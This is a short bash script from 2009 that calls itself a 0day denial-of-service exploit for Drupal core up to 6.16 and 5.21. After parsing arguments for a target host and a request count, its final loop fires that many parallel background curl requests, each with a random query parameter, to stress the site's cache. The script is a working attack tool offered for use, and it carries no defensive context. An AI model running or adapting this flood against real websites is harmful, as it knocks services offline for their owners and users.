#!/bin/bash
#
# Copyright (C) 2009 Emanuele Gentili < emgent@backtrack.it >
#
# This program is released under the terms of the GNU General Public License
# (GPL), which is distributed with this software in the file "COPYING".
# The GPL specifies the terms under which users may copy and use this software.
#
# Drupd0s.sh
# This is a 0day DOS issue for Drupal Core that use cache stressing with random
# parameter on multiple requests.
#

show_help(){
  echo ""
  echo " 2009 (C) Drupd0s.sh - 0day Drupal DOS <= 6.16 and 5.21"
  echo ""
  echo " --usage    show the exploit Usage"
  echo " --prereq      show the exploit Prerequisites"
  echo " --credits  show the exploit Credits"
  echo " --help     show the Help"
  echo ""
  echo "Emanuele Gentili <emgent@backtrack.it>"
}

show_credits(){
  echo ""
  echo " Emanuele 'emgent' Gentili"
  echo " http://www.backtrack.it/~emgent/"
  echo " emgent @ backtrack.it"
  echo ""
}

show_prereq(){
 echo ""
 echo " 2009 (C) Drupd0s.sh - 0day Drupal DOS <= 6.16 and 5.21"
 echo ""
 echo " Prerequeisites:"
 echo " Bash (yeah because is cool.)"
 echo " Curl"
 echo ""
 echo " Emanuele Gentili <emgent@backtrack.it>"
}

show_usage(){
  echo ""
  echo " 2009 (C) Drupd0s.sh - 0day Drupal DOS <= 6.16 and 5.21"
  echo ""
  echo " usage $0 --host http://localhost/drupal/ --requests 1000"
  echo ""
  echo " Emanuele Gentili <emgent@backtrack.it>"
}


# Bash
while [[ $# != 0 ]]; do
    arg_name=$1; shift
    case "$arg_name" in
      --help|-?|-h) show_help; exit 0;;
      --credits) show_credits; exit 0;;
      --usage) show_usage; exit 0;;
      --prereq) show_prereq; exit 0;;
      --host) host=$1; shift;;
      --requests) requests=$1; shift;;
      *) echo "invalid option: $1"; show_help;exit 1;;
    esac
done

[ -z "$host" ] && { show_help; exit 1; }

for random in `seq 1 $requests`; do
curl -A Firefox -o --url "$host/?q=node/2&d0s=$random" > /dev/null 2>&1 &
done

# 2009-12-30 enJoy.